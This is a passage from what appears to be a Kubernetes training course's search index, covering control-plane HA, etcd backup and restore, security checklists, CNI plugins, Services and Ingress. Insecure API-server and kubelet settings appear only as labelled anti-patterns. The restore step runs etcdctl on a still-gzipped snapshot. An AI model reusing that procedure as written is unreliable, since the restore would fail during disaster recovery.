Requires more infrastructure - Recommended for production</p> <pre><code># External etcd HA cluster\netcd Node 1: etcd only\netcd Node 2: etcd only\netcd Node 3: etcd only\nMaster Node 1: API, controller-manager, scheduler\nMaster Node 2: API, controller-manager, scheduler\nMaster Node 3: API, controller-manager, scheduler\nLoad Balancer: Distributes traffic across all API servers\n</code></pre>"},{"location":"02-control-plane/#52-load-balancer-configuration","title":"5.2 Load Balancer Configuration","text":"<p>HAProxy Example:</p> <pre><code># /etc/haproxy/haproxy.cfg\nglobal\n    log /dev/log local0\n    log /dev/log local1 notice\n    daemon\n\ndefaults\n    log global\n    mode tcp\n    option tcplog\n    option dontlognull\n    timeout connect 5000ms\n    timeout client 50000ms\n    timeout server 50000ms\n\nfrontend kubernetes-apiserver\n    bind *:6443\n    mode tcp\n    option tcplog\n    default_backend kubernetes-apiserver\n\nbackend kubernetes-apiserver\n    mode tcp\n    balance roundrobin\n    option tcp-check\n    server master-1 192.168.1.101:6443 check\n    server master-2 192.168.1.102:6443 check\n    server master-3 192.168.1.103:6443 check\n</code></pre>"},{"location":"02-control-plane/#53-leader-election","title":"5.3 Leader Election","text":"<p>Controller-manager and scheduler use leader election to ensure only one instance is active at a time:</p> <pre><code># Leader election settings\n- --leader-elect=true\n- --leader-elect-lease-duration=15s\n- --leader-elect-renew-deadline=10s\n- --leader-elect-retry-period=2s\n</code></pre>"},{"location":"02-control-plane/#6-etcd-backup-and-restore","title":"6. etcd Backup and Restore","text":""},{"location":"02-control-plane/#61-automated-backup-script","title":"6.1 Automated Backup Script","text":"<pre><code>#!/bin/bash\n# /usr/local/bin/etcd-backup.sh\n\nset -euo pipefail\n\nBACKUP_DIR=\"/var/backups/etcd\"\nRETENTION_DAYS=30\nTIMESTAMP=$(date +%Y%m%d-%H%M%S)\nBACKUP_FILE=\"${BACKUP_DIR}/etcd-snapshot-${TIMESTAMP}.db\"\n\n# Certificate paths\nETCD_CACERT=\"/etc/kubernetes/pki/etcd/ca.crt\"\nETCD_CERT=\"/etc/kubernetes/pki/etcd/server.crt\"\nETCD_KEY=\"/etc/kubernetes/pki/etcd/server.key\"\nETCD_ENDPOINTS=\"https://127.0.0.1:2379\"\n\n# Create backup directory\nmkdir -p \"${BACKUP_DIR}\"\n\n# Create snapshot\necho \"Creating etcd snapshot: ${BACKUP_FILE}\"\nETCDCTL_API=3 etcdctl snapshot save \"${BACKUP_FILE}\" \\\n  --endpoints=\"${ETCD_ENDPOINTS}\" \\\n  --cacert=\"${ETCD_CACERT}\" \\\n  --cert=\"${ETCD_CERT}\" \\\n  --key=\"${ETCD_KEY}\"\n\n# Verify snapshot\necho \"Verifying snapshot...\"\nETCDCTL_API=3 etcdctl snapshot status \"${BACKUP_FILE}\" \\\n  --write-out=table\n\n# Compress backup\necho \"Compressing snapshot...\"\ngzip \"${BACKUP_FILE}\"\n\n# Remove old backups\necho \"Removing backups older than ${RETENTION_DAYS} days...\"\nfind \"${BACKUP_DIR}\" -name \"etcd-snapshot-*.db.gz\" -mtime +${RETENTION_DAYS} -delete\n\n# Upload to remote storage (optional)\n# aws s3 cp \"${BACKUP_FILE}.gz\" s3://my-bucket/etcd-backups/\n\necho \"Backup completed successfully: ${BACKUP_FILE}.gz\"\n</code></pre> <p>Cron Job:</p> <pre><code># /etc/cron.d/etcd-backup\n0 2 * * * root /usr/local/bin/etcd-backup.sh &gt;&gt; /var/log/etcd-backup.log 2&gt;&amp;1\n</code></pre>"},{"location":"02-control-plane/#62-disaster-recovery-procedure","title":"6.2 Disaster Recovery Procedure","text":"<pre><code>#!/bin/bash\n# Restore etcd from backup\n\n# 1. Stop all control plane components\nsystemctl stop kubelet\nmv /etc/kubernetes/manifests/*.yaml /tmp/\n\n# 2. Stop etcd if running\nsystemctl stop etcd  # if running as systemd service\n\n# 3. Backup current etcd data\nmv /var/lib/etcd /var/lib/etcd-backup-$(date +%Y%m%d)\n\n# 4. Restore from snapshot\nETCDCTL_API=3 etcdctl snapshot restore /backup/etcd-snapshot.db.gz \\\n  --data-dir=/var/lib/etcd \\\n  --name=master-1 \\\n  --initial-cluster=master-1=https://192.168.1.101:2380,master-2=https://192.168.1.102:2380,master-3=https://192.168.1.103:2380 \\\n  --initial-advertise-peer-urls=https://192.168.1.101:2380\n\n# 5. Set correct permissions\nchown -R etcd:etcd /var/lib/etcd\n\n# 6. Start control plane components\nmv /tmp/*.yaml /etc/kubernetes/manifests/\nsystemctl start kubelet\n\n# 7. Verify cluster health\nkubectl get nodes\nkubectl get pods --all-namespaces\n</code></pre>"},{"location":"02-control-plane/#7-best-practices","title":"7. Best Practices","text":""},{"location":"02-control-plane/#71-control-plane-best-practices","title":"7.1 Control Plane Best Practices","text":"<ol> <li>Run control plane on dedicated nodes</li> <li>Taint master nodes to prevent workload scheduling</li> <li> <p>Ensure sufficient resources for control plane</p> </li> <li> <p>Implement High Availability</p> </li> <li>Minimum 3 control plane nodes</li> <li>Use load balancer for API server</li> <li> <p>Consider external etcd topology for critical clusters</p> </li> <li> <p>Secure API Server</p> </li> <li>Enable audit logging</li> <li>Use strong authentication (OIDC, certificates)</li> <li>Enable admission controllers</li> <li> <p>Restrict access with RBAC</p> </li> <li> <p>Monitor control plane components</p> </li> <li>Use metrics endpoints</li> <li>Set up alerting for component failures</li> <li>Monitor etcd health and performance</li> </ol>"},{"location":"02-control-plane/#72-etcd-best-practices","title":"7.2 etcd Best Practices","text":"<ol> <li>Regular backups</li> <li>Automated daily backups minimum</li> <li>Store backups off-cluster</li> <li> <p>Test restore procedures regularly</p> </li> <li> <p>Use dedicated storage</p> </li> <li>SSD storage for etcd data</li> <li>Separate disk from OS</li> <li> <p>Monitor disk I/O and latency</p> </li> <li> <p>Tune etcd performance</p> </li> <li>Adjust snapshot count (--snapshot-count)</li> <li>Monitor database size</li> <li> <p>Defragment regularly</p> </li> <li> <p>Secure etcd</p> </li> <li>Enable TLS for client and peer communication</li> <li>Use strong encryption</li> <li>Restrict network access</li> </ol>"},{"location":"02-control-plane/#73-node-component-best-practices","title":"7.3 Node Component Best Practices","text":"<ol> <li>Kubelet security</li> <li>Disable anonymous auth</li> <li>Enable webhook authorization</li> <li>Rotate certificates automatically</li> <li> <p>Disable read-only port</p> </li> <li> <p>Resource management</p> </li> <li>Set appropriate eviction thresholds</li> <li>Reserve resources for system components</li> <li> <p>Configure node allocatable correctly</p> </li> <li> <p>Container runtime</p> </li> <li>Use recent stable versions</li> <li>Enable content trust</li> <li>Configure resource limits</li> </ol>"},{"location":"02-control-plane/#8-anti-patterns-and-common-mistakes","title":"8. Anti-Patterns and Common Mistakes","text":""},{"location":"02-control-plane/#81-control-plane-anti-patterns","title":"8.1 Control Plane Anti-Patterns","text":"<p>\u274c Single control plane node - No high availability - Single point of failure - Downtime during maintenance</p> <p>\u274c No etcd backups - Data loss risk - No disaster recovery capability - Cannot restore cluster state</p> <p>\u274c Insecure API server <pre><code># DON'T DO THIS\n- --insecure-port=8080  # Enables unauthenticated access\n- --anonymous-auth=true  # Allows anonymous requests\n</code></pre></p> <p>\u274c Running workloads on control plane - Resource contention - Stability issues - Security risk</p>"},{"location":"02-control-plane/#82-etcd-anti-patterns","title":"8.2 etcd Anti-Patterns","text":"<p>\u274c etcd on slow storage - High latency - Performance degradation - Cluster instability</p> <p>\u274c Large etcd database - Slow operations - Memory issues - Long backup/restore times</p> <p>\u274c No monitoring - Cannot detect issues early - No capacity planning - Reactive rather than proactive</p>"},{"location":"02-control-plane/#83-kubelet-anti-patterns","title":"8.3 Kubelet Anti-Patterns","text":"<p>\u274c Anonymous authentication enabled <pre><code># INSECURE\nauthentication:\n  anonymous:\n    enabled: true  # Allows unauthenticated access\n</code></pre></p> <p>\u274c Read-only port enabled <pre><code># INSECURE\nreadOnlyPort: 10255  # Exposes metrics without auth\n</code></pre></p> <p>\u274c No resource reservations - System processes starved - Node instability - Pod evictions</p>"},{"location":"02-control-plane/#9-hands-on-lab-references","title":"9. Hands-on Lab References","text":"<p>This module includes the following hands-on labs in the <code>/labs/02-control-plane/</code> directory:</p> <ol> <li>Lab 2.1: Exploring Control Plane Components</li> <li>Inspect control plane pods</li> <li>View component logs</li> <li>Check component health</li> <li> <p>File: <code>/labs/02-control-plane/lab-2.1-exploration.md</code></p> </li> <li> <p>Lab 2.2: etcd Backup and Restore</p> </li> <li>Create etcd backups</li> <li>Restore from snapshot</li> <li>Verify cluster state</li> <li> <p>File: <code>/labs/02-control-plane/lab-2.2-etcd-backup.md</code></p> </li> <li> <p>Lab 2.3: High Availability Setup</p> </li> <li>Deploy multi-master cluster</li> <li>Configure load balancer</li> <li>Test failover scenarios</li> <li> <p>File: <code>/labs/02-control-plane/lab-2.3-ha-setup.md</code></p> </li> <li> <p>Lab 2.4: Troubleshooting Control Plane</p> </li> <li>Debug API server issues</li> <li>Resolve scheduling problems</li> <li>Fix node communication</li> <li>File: <code>/labs/02-control-plane/lab-2.4-troubleshooting.md</code></li> </ol>"},{"location":"02-control-plane/#10-security-checklist","title":"10. Security Checklist","text":""},{"location":"02-control-plane/#api-server-security","title":"API Server Security","text":"<ul> <li>[ ] Enable audit logging with appropriate policy</li> <li>[ ] Use TLS for all communication</li> <li>[ ] Enable NodeRestriction admission plugin</li> <li>[ ] Configure strong authentication (OIDC, certificates)</li> <li>[ ] Enable RBAC authorization</li> <li>[ ] Disable insecure port (--insecure-port=0)</li> <li>[ ] Disable anonymous authentication for production</li> <li>[ ] Enable admission controllers (PodSecurity, ResourceQuota, etc.)</li> <li>[ ] Set appropriate request timeout</li> <li>[ ] Limit API request rate</li> </ul>"},{"location":"02-control-plane/#etcd-security","title":"etcd Security","text":"<ul> <li>[ ] Enable TLS for client communication</li> <li>[ ] Enable TLS for peer communication</li> <li>[ ] Enable client certificate authentication</li> <li>[ ] Restrict network access to etcd (firewall)</li> <li>[ ] Regular automated backups</li> <li>[ ] Encrypt etcd data at rest</li> <li>[ ] Monitor etcd metrics and health</li> <li>[ ] Test restore procedures regularly</li> <li>[ ] Use dedicated storage for etcd</li> <li>[ ] Implement backup retention policy</li> </ul>"},{"location":"02-control-plane/#kubelet-security","title":"Kubelet Security","text":"<ul> <li>[ ] Disable anonymous authentication</li> <li>[ ] Enable webhook authorization</li> <li>[ ] Rotate certificates automatically</li> <li>[ ] Disable read-only port</li> <li>[ ] Use TLS for API server communication</li> <li>[ ] Enable NodeRestriction</li> <li>[ ] Set appropriate file permissions</li> <li>[ ] Configure seccomp profiles</li> <li>[ ] Enable protect-kernel-defaults</li> </ul>"},{"location":"02-control-plane/#controller-manager-security","title":"Controller Manager Security","text":"<ul> <li>[ ] Enable leader election for HA</li> <li>[ ] Use service account credentials</li> <li>[ ] Bind to localhost only</li> <li>[ ] Enable TLS</li> <li>[ ] Rotate service account keys</li> <li>[ ] Use separate service accounts per controller</li> </ul>"},{"location":"02-control-plane/#scheduler-security","title":"Scheduler Security","text":"<ul> <li>[ ] Enable leader election for HA</li> <li>[ ] Bind to localhost only</li> <li>[ ] Use webhook authentication</li> <li>[ ] Enable TLS</li> <li>[ ] Restrict scheduler permissions</li> </ul>"},{"location":"02-control-plane/#11-references","title":"11. References","text":"<ol> <li>Kubernetes Official Documentation</li> <li>Cluster Architecture: https://kubernetes.io/docs/concepts/architecture/</li> <li>Control Plane Components: https://kubernetes.io/docs/concepts/overview/components/</li> <li>Node Components: https://kubernetes.io/docs/concepts/architecture/nodes/</li> <li> <p>High Availability: https://kubernetes.io/docs/setup/production-environment/tools/kubeadm/high-availability/</p> </li> <li> <p>etcd Documentation</p> </li> <li>Official Documentation: https://etcd.io/docs/</li> <li>Disaster Recovery: https://etcd.io/docs/v3.5/op-guide/recovery/</li> <li> <p>Performance Tuning: https://etcd.io/docs/v3.5/tuning/</p> </li> <li> <p>Security Guides</p> </li> <li>CIS Kubernetes Benchmark: https://www.cisecurity.org/benchmark/kubernetes</li> <li>Kubernetes Security: https://kubernetes.io/docs/concepts/security/</li> <li> <p>API Server Audit: https://kubernetes.io/docs/tasks/debug/debug-cluster/audit/</p> </li> <li> <p>CNCF Resources</p> </li> <li>Kubernetes Architecture SIG: https://github.com/kubernetes/community/tree/master/sig-architecture</li> <li> <p>CNCF Cloud Native Glossary: https://glossary.cncf.io/</p> </li> <li> <p>Books and Guides</p> </li> <li>\"Kubernetes: Up and Running\" by Kelsey Hightower et al. (O'Reilly)</li> <li>\"Managing Kubernetes\" by Brendan Burns and Craig Tracey (O'Reilly)</li> <li> <p>\"Production Kubernetes\" by Josh Rosso et al. (O'Reilly)</p> </li> <li> <p>Tools and Utilities</p> </li> <li>etcdctl: https://github.com/etcd-io/etcd/tree/main/etcdctl</li> <li>kubeadm: https://kubernetes.io/docs/reference/setup-tools/kubeadm/</li> <li>Velero (Backup): https://velero.io/</li> </ol>"},{"location":"02-control-plane/#summary","title":"Summary","text":"<p>In this module, you learned about the architecture and components that make up a Kubernetes cluster:</p> <p>Control Plane Components: - kube-apiserver serves the Kubernetes API and is the gateway for all operations - etcd stores all cluster state and requires regular backups - kube-controller-manager runs controllers that maintain desired state - kube-scheduler assigns Pods to nodes based on resource requirements and constraints</p> <p>Worker Node Components: - kubelet manages container lifecycle on nodes - kube-proxy maintains network rules for service communication - Container runtime executes containers (containerd, CRI-O)</p> <p>You also learned high availability patterns, etcd backup/restore procedures, and security best practices for production clusters.</p> <p>Next Module: 03-networking.md - Kubernetes Networking</p>"},{"location":"03-networking/","title":"Module 03: Kubernetes Networking","text":""},{"location":"03-networking/#overview","title":"Overview","text":"<p>Estimated Time: 4-5 hours</p> <p>Module Type: Deep Dive</p> <p>Prerequisites: - Module 01 - Kubernetes Basics - Module 02 - Control Plane and Cluster Components - Basic understanding of networking concepts (IP, TCP/UDP, DNS)</p> <p>Kubernetes networking is one of the most complex aspects of the platform. This module covers the Container Network Interface (CNI), Service types, Ingress controllers, and Network Policies. You'll learn how Kubernetes implements networking to enable Pod-to-Pod communication, service discovery, and traffic management while maintaining security and performance.</p>"},{"location":"03-networking/#learning-objectives","title":"Learning Objectives","text":"<p>By the end of this module, you will be able to:</p> <ol> <li>Explain the Kubernetes networking model and its requirements</li> <li>Understand CNI plugins and compare popular implementations (Calico, Cilium, Flannel)</li> <li>Configure different Service types and understand their use cases</li> <li>Deploy and configure Ingress controllers for external access</li> <li>Implement Network Policies for micro-segmentation</li> <li>Troubleshoot common networking issues</li> <li>Apply networking security best practices</li> <li>Design network architectures for multi-tenant clusters</li> </ol>"},{"location":"03-networking/#1-kubernetes-networking-model","title":"1. Kubernetes Networking Model","text":""},{"location":"03-networking/#11-fundamental-requirements","title":"1.1 Fundamental Requirements","text":"<p>The Kubernetes networking model has four key requirements:</p> <ol> <li>Pods can communicate with all other Pods on any node without NAT</li> <li>Agents on a node (e.g., kubelet) can communicate with all Pods on that node</li> <li>Pods in the host network of a node can communicate with all Pods on all nodes without NAT</li> <li>Each Pod gets its own unique IP address</li> </ol>"},{"location":"03-networking/#12-network-namespaces","title":"1.2 Network Namespaces","text":"<p>Pods use Linux network namespaces to provide network isolation:</p> <pre><code># View network namespaces\nip netns list\n\n# Execute command in Pod's network namespace\nnsenter --net=/var/run/netns/cni-xxx ip addr\n\n# View Pod networking from node\ncrictl inspectp &lt;pod-id&gt; | jq '.info.runtimeSpec.linux.namespaces'\n</code></pre>"},{"location":"03-networking/#13-ip-address-management-ipam","title":"1.3 IP Address Management (IPAM)","text":"<p>Cluster IP Ranges: - Pod CIDR: IP range for Pod IPs (e.g., 10.244.0.0/16) - Service CIDR: IP range for Service IPs (e.g., 10.96.0.0/12) - Node CIDR: IP range for node IPs (varies by infrastructure)</p> <p>Example cluster-wide IP allocation:</p> <pre><code># kube-controller-manager configuration\n- --cluster-cidr=10.244.0.0/16       # Pod network\n- --service-cluster-ip-range=10.96.0.0/12  # Service network\n- --allocate-node-cidrs=true\n- --node-cidr-mask-size=24           # Each node gets /24 subnet\n</code></pre>"},{"location":"03-networking/#2-container-network-interface-cni","title":"2. Container Network Interface (CNI)","text":""},{"location":"03-networking/#21-what-is-cni","title":"2.1 What is CNI?","text":"<p>CNI (Container Network Interface) is a specification and libraries for configuring network interfaces in Linux containers. CNI plugins are responsible for:</p> <ul> <li>Assigning IP addresses to Pods</li> <li>Setting up network interfaces</li> <li>Configuring routes</li> <li>Implementing network policies</li> </ul> <p>CNI Configuration:</p> <pre><code>{\n  \"cniVersion\": \"0.4.0\",\n  \"name\": \"k8s-pod-network\",\n  \"plugins\": [\n    {\n      \"type\": \"calico\",\n      \"datastore_type\": \"kubernetes\",\n      \"mtu\": 1440,\n      \"ipam\": {\n        \"type\": \"calico-ipam\",\n        \"assign_ipv4\": \"true\",\n        \"assign_ipv6\": \"false\"\n      },\n      \"policy\": {\n        \"type\": \"k8s\"\n      },\n      \"kubernetes\": {\n        \"kubeconfig\": \"/etc/cni/net.d/calico-kubeconfig\"\n      }\n    },\n    {\n      \"type\": \"portmap\",\n      \"capabilities\": {\"portMappings\": true}\n    },\n    {\n      \"type\": \"bandwidth\",\n      \"capabilities\": {\"bandwidth\": true}\n    }\n  ]\n}\n</code></pre>"},{"location":"03-networking/#22-calico","title":"2.2 Calico","text":"<p>Overview: - Layer 3 networking using BGP - Network policy enforcement - Both overlay (VXLAN, IPIP) and underlay (BGP) modes - High performance and scalability</p> <p>Installation:</p> <pre><code># Install Calico operator\nkubectl create -f https://raw.githubusercontent.com/projectcalico/calico/v3.26.0/manifests/tigera-operator.yaml\n\n# Install Calico custom resources\napiVersion: operator.tigera.io/v1\nkind: Installation\nmetadata:\n  name: default\nspec:\n  calicoNetwork:\n    ipPools:\n    - blockSize: 26\n      cidr: 10.244.0.0/16\n      encapsulation: VXLANCrossSubnet\n      natOutgoing: Enabled\n      nodeSelector: all()\n  registry: quay.io/\n---\napiVersion: operator.tigera.io/v1\nkind: APIServer\nmetadata:\n  name: default\nspec: {}\n</code></pre> <p>Calico Features:</p> <pre><code># Enable IP-in-IP encapsulation\napiVersion: projectcalico.org/v3\nkind: IPPool\nmetadata:\n  name: default-ipv4-ippool\nspec:\n  cidr: 10.244.0.0/16\n  ipipMode: CrossSubnet\n  natOutgoing: true\n  nodeSelector: all()\n</code></pre> <p>Advantages: - Excellent network policy support - High performance in BGP mode - Flexible encapsulation options - Extensive documentation</p> <p>Disadvantages: - More complex to configure - BGP requires networking knowledge - Overhead in overlay modes</p>"},{"location":"03-networking/#23-cilium","title":"2.3 Cilium","text":"<p>Overview: - eBPF-based networking and security - Layer 7 network policies - Built-in observability with Hubble - Service mesh capabilities</p> <p>Installation:</p> <pre><code># Install Cilium CLI\ncurl -L --remote-name-all https://github.com/cilium/cilium-cli/releases/latest/download/cilium-linux-amd64.tar.gz\ntar xzvfC cilium-linux-amd64.tar.gz /usr/local/bin\n\n# Install Cilium\ncilium install --version 1.14.0 \\\n  --set ipam.mode=kubernetes \\\n  --set tunnel=vxlan \\\n  --set encryption.enabled=true \\\n  --set encryption.type=wireguard\n</code></pre> <p>Cilium Configuration:</p> <pre><code>apiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: cilium-config\n  namespace: kube-system\ndata:\n  enable-ipv4: \"true\"\n  enable-ipv6: \"false\"\n  tunnel: \"vxlan\"\n  monitor-aggregation: \"medium\"\n  ipam: \"kubernetes\"\n  enable-bpf-masquerade: \"true\"\n  enable-hubble: \"true\"\n  hubble-listen-address: \":4244\"\n  enable-policy: \"default\"\n  policy-audit-mode: \"false\"\n  enable-l7-proxy: \"true\"\n  enable-wireguard: \"true\"\n</code></pre> <p>Layer 7 Network Policy Example:</p> <pre><code>apiVersion: cilium.io/v2\nkind: CiliumNetworkPolicy\nmetadata:\n  name: api-access-control\nspec:\n  endpointSelector:\n    matchLabels:\n      app: api-server\n  ingress:\n  - fromEndpoints:\n    - matchLabels:\n        app: frontend\n    toPorts:\n    - ports:\n      - port: \"80\"\n        protocol: TCP\n      rules:\n        http:\n        - method: \"GET\"\n          path: \"/api/v1/.*\"\n        - method: \"POST\"\n          path: \"/api/v1/users\"\n</code></pre> <p>Advantages: - High performance with eBPF - Advanced observability - Layer 7 policy support - Transparent encryption</p> <p>Disadvantages: - Requires recent kernel (5.4+) - More complex troubleshooting - Higher learning curve</p>"},{"location":"03-networking/#24-flannel","title":"2.4 Flannel","text":"<p>Overview: - Simple overlay network - Easy to set up and maintain - Supports multiple backends (VXLAN, host-gw, WireGuard) - No network policy support (requires additional CNI)</p> <p>Installation:</p> <pre><code>kubectl apply -f https://github.com/flannel-io/flannel/releases/latest/download/kube-flannel.yml\n</code></pre> <p>Configuration:</p> <pre><code>{\n  \"Network\": \"10.244.0.0/16\",\n  \"Backend\": {\n    \"Type\": \"vxlan\",\n    \"VNI\": 1,\n    \"Port\": 8472\n  }\n}\n</code></pre> <p>Advantages: - Simple and easy to understand - Minimal configuration - Stable and reliable - Low overhead</p> <p>Disadvantages: - No built-in network policies - Limited features - Less flexible than alternatives</p>"},{"location":"03-networking/#25-cni-comparison","title":"2.5 CNI Comparison","text":"Feature Calico Cilium Flannel Network Policies Yes Yes (L3-L7) No Encryption Yes Yes (WireGuard) Yes (WireGuard) Observability Basic Advanced (Hubble) None Performance High Very High Good Complexity Medium High Low Service Mesh No Yes No Windows Support Yes Limited Yes"},{"location":"03-networking/#3-services","title":"3. Services","text":""},{"location":"03-networking/#31-clusterip","title":"3.1 ClusterIP","text":"<p>Default service type. Exposes service on an internal cluster IP.</p> <pre><code>apiVersion: v1\nkind: Service\nmetadata:\n  name: backend-api\n  labels:\n    app: backend\nspec:\n  type: ClusterIP\n  selector:\n    app: backend\n    tier: api\n  ports:\n  - name: http\n    port: 80\n    targetPort: 8080\n    protocol: TCP\n  - name: grpc\n    port: 9090\n    targetPort: 9090\n    protocol: TCP\n  sessionAffinity: ClientIP\n  sessionAffinityConfig:\n    clientIP:\n      timeoutSeconds: 10800\n</code></pre> <p>DNS Resolution: - Within same namespace: <code>backend-api</code> - From other namespace: <code>backend-api.default.svc.cluster.local</code> - Full FQDN: <code>backend-api.default.svc.cluster.local</code></p> <p>Use Cases: - Internal service communication - Microservices architecture - Backend services not exposed externally</p>"},{"location":"03-networking/#32-nodeport","title":"3.2 NodePort","text":"<p>Exposes service on each node's IP at a static port (30000-32767).</p> <pre><code>apiVersion: v1\nkind: Service\nmetadata:\n  name: web-nodeport\nspec:\n  type: NodePort\n  selector:\n    app: web\n  ports:\n  - port: 80\n    targetPort: 8080\n    nodePort: 30080\n    protocol: TCP\n</code></pre> <p>Access: - From outside cluster: <code>http://&lt;any-node-ip&gt;:30080</code> - From inside cluster: <code>http://web-nodeport:80</code></p> <p>Use Cases: - Development and testing - On-premises without load balancer - Temporary external access</p> <p>Limitations: - Only one service per port - Limited port range (30000-32767) - Requires knowledge of node IPs - No built-in load balancing across nodes</p>"},{"location":"03-networking/#33-loadbalancer","title":"3.3 LoadBalancer","text":"<p>Provisions an external load balancer (cloud provider dependent).</p> <pre><code>apiVersion: v1\nkind: Service\nmetadata:\n  name: web-lb\n  annotations:\n    service.beta.kubernetes.io/aws-load-balancer-type: \"nlb\"\n    service.beta.kubernetes.io/aws-load-balancer-internal: \"false\"\n    service.beta.kubernetes.io/aws-load-balancer-cross-zone-load-balancing-enabled: \"true\"\nspec:\n  type: LoadBalancer\n  selector:\n    app: web\n  ports:\n  - port: 80\n    targetPort: 8080\n    protocol: TCP\n  loadBalancerSourceRanges:\n  - \"203.0.113.0/24\"  # Restrict source IPs\n  externalTrafficPolicy: Local  # Preserve source IP\n</code></pre> <p>Cloud Provider Examples:</p> <p>AWS: <pre><code>metadata:\n  annotations:\n    service.beta.kubernetes.io/aws-load-balancer-type: \"nlb\"\n    service.beta.kubernetes.io/aws-load-balancer-ssl-cert: \"arn:aws:acm:...\"\n    service.beta.kubernetes.io/aws-load-balancer-backend-protocol: \"http\"\n</code></pre></p> <p>GCP: <pre><code>metadata:\n  annotations:\n    cloud.google.com/load-balancer-type: \"Internal\"\n    networking.gke.io/load-balancer-type: \"Internal\"\n</code></pre></p> <p>Azure: <pre><code>metadata:\n  annotations:\n    service.beta.kubernetes.io/azure-load-balancer-internal: \"true\"\n</code></pre></p> <p>Use Cases: - Production external services - Cloud deployments - HTTP/HTTPS services - TCP/UDP load balancing</p>"},{"location":"03-networking/#34-headless-services","title":"3.4 Headless Services","text":"<p>Services without a cluster IP, used for direct Pod-to-Pod communication.</p> <pre><code>apiVersion: v1\nkind: Service\nmetadata:\n  name: database-headless\nspec:\n  clusterIP: None  # Headless service\n  selector:\n    app: database\n  ports:\n  - port: 5432\n    targetPort: 5432\n</code></pre> <p>Use Cases: - StatefulSets - Service discovery without load balancing - Client-side load balancing - Database clusters</p>"},{"location":"03-networking/#35-externalname","title":"3.5 ExternalName","text":"<p>Maps a service to a DNS name.</p> <pre><code>apiVersion: v1\nkind: Service\nmetadata:\n  name: external-db\n  namespace: production\nspec:\n  type: ExternalName\n  externalName: prod-db.example.com\n  ports:\n  - port: 5432\n</code></pre> <p>Use Cases: - External service integration - Migration from external to in-cluster services - Service abstraction</p>"},{"location":"03-networking/#4-ingress","title":"4. Ingress","text":""},{"location":"03-networking/#41-what-is-ingress","title":"4.1 What is Ingress?","text":"<p>Ingress exposes HTTP and HTTPS routes from outside the cluster to services within the cluster. It provides:</p> <ul> <li>HTTP(S) routing</li> <li>SSL/TLS termination</li> <li>Name-based virtual hosting</li> <li>Path-based routing</li> <li>Load balancing</li> </ul>"},{"location":"03-networking/#42-ingress-controllers","title":"4.2 Ingress Controllers","text":"<p>Popular Ingress Controllers: - NGINX Ingress Controller: Most widely used - Traefik: Modern, feature-rich - HAProxy Ingress: High performance - Contour: VMware-backed, uses Envoy - Ambassador/Emissary: API Gateway features - Istio Gateway: Service mesh integration</p>"},{"location":"03-networking/#43-nginx-ingress-controller","title":"4.3 NGINX Ingress Controller","text":"<p>Installation:</p> <pre><code>kubectl apply -f https://raw.githubusercontent.com/kubernetes/ingress-nginx/controller-v1.8.0/deploy/static/provider/cloud/deploy.yaml\n</code></pre> <p>Basic Ingress:</p> <pre><code>apiVersion: networking.k8s.io/v1\nkind: Ingress\nmetadata:\n  name: web-ingress\n  annotations:\n    nginx.ingress.kubernetes.io/rewrite-target: /\nspec:\n  ingressClassName: nginx\n  rules:\n  - host: www.example.com\n    http:\n      paths:\n      - path: /\n        pathType: Prefix\n        backend:\n          service:\n            name: web-service\n            port:\n              number: 80\n</code></pre> <p>TLS/SSL Ingress:</p> <pre><code>apiVersion: v1\nkind: Secret\nmetadata:\n  name: tls-secret\ntype: kubernetes.io/tls\ndata:\n  tls.crt: &lt;base64-encoded-cert&gt;\n  tls.key: &lt;base64-encoded-key&gt;\n---\napiVersion: networking.k8s.io/v1\nkind: Ingress\nmetadata:\n  name: web-ingress-tls\n  annotations:\n    cert-manager.io/cluster-issuer: \"letsencrypt-prod\"\n    nginx.ingress.kubernetes.io/ssl-redirect: \"true\"\nspec:\n  ingressClassName: nginx\n  tls:\n  - hosts:\n    - www.example.com\n    secretName: tls-secret\n  rules:\n  - host: www.example.com\n    http:\n      paths:\n      - path: /\n        pathType: Prefix\n        backend:\n          service:\n            name: web-service\n            port:\n              number: 80\n</code></pre> <p>Advanced Routing:</p> <pre><code>apiVersion: networking.k8s.io/v1\nkind: Ingress\nmetadata:\n  name: api-ingress\n  annotations:\n    nginx.ingress.kubernetes.io/use-regex: \"true\"\n    nginx.ingress.kubernetes.io/rate-limit: \"100\"\n    nginx.ingress.kubernetes.io/limit-rps: \"10\"\n    nginx.ingress.kubernetes.io/auth-type: basic\n    nginx.ingress.kubernetes.io/auth-secret: basic-auth\nspec:\n  ingressClassName: nginx\n  rules:\n  - host: api.example.com\n    http:\n      paths:\n      - path: /v1/users\n        pathType: Prefix\n        backend:\n          service:\n            name: user-api\n            port:\n              number: 8080\n      - path: /v1/orders\n        pathType: Prefix\n        backend:\n          service:\n            name: order-api\n            port:\n              number: 8080\n      - path: /v2/.*\n        pathType: ImplementationSpecific\n        backend:\n          service:\n            name: api-v2\n            port:\n              number: 8080\n</code></pre>"},{"location":"03-networking/#44-cert-manager-for-tls","title":"4.4 cert-manager for TLS","text":"<pre><code># Install cert-manager\nkubectl apply -f https://github.com/cert-manager/cert-manager/releases/download/v1.12.0/cert-manager.yaml\n\n# ClusterIssuer for Let's Encrypt\napiVersion: cert-manager.io/v1\nkind: ClusterIssuer\nmetadata:\n  name: letsencrypt-prod\nspec:\n  acme:\n    server: https://acme-v02.api.letsencrypt.org/directory\n    email: admin@example.com\n    privateKeySecretRef:\n      name: letsencrypt-prod\n    solvers:\n    - http01:\n        ingress:\n          class: nginx\n</code></pre>"},{"location":"03-networking/#5-network-policies","title":"5. Network Policies","text":""},{"location":"03-networking/#51-what-are-network-policies","title":"5.1 What are Network Policies?","text":"<p>Network Policies are specifications for controlling network traffic between Pods. They provide micro-segmentation and implement zero-trust networking.</p> <p>Requirements: - CNI plugin must support Network Policies (Calico, Cilium, etc.) - Policies are namespace-scoped - Default deny is recommended</p>"},{"location":"03-networking/#52-default-deny-policy","title":"5.2 Default Deny Policy","text":"<p>Deny all ingress:</p> <pre><code>apiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: default-deny-ingress\n  namespace: production\nspec:\n  podSelector: {}\n  policyTypes:\n  - Ingress\n</code></pre> <p>Deny all egress:</p> <pre><code>apiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: default-deny-egress\n  namespace: production\nspec:\n  podSelector: {}\n  policyTypes:\n  - Egress\n</code></pre> <p>Deny all ingress and egress:</p> <pre><code>apiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: default-deny-all\n  namespace: production\nspec:\n  podSelector: {}\n  policyTypes:\n  